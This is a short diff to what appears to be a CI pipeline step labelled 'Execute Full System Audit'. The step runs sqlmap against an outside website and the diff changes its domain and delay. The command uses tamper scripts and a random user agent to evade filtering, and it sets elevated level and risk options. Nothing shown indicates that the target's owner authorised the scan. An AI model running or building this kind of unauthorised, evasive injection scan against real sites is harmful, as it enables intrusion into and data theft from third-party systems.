@@ -1,11 +1,11 @@
 - name: Execute Full System Audit
       run: |
         cd sqlmap-dev
-        python3 sqlmap.py -u "https://checkccv.kiwi/?action=home&category=5" \
+        python3 sqlmap.py -u "https://checkccv.wiki/?action=home&category=5" \
           --force-dns \
           --random-agent \
           --tamper=space2comment,between,randomcase \
-          --delay=0.5 \
+          --delay=1 \
           --threads=1 \
           --level=3 \
           --risk=2 \
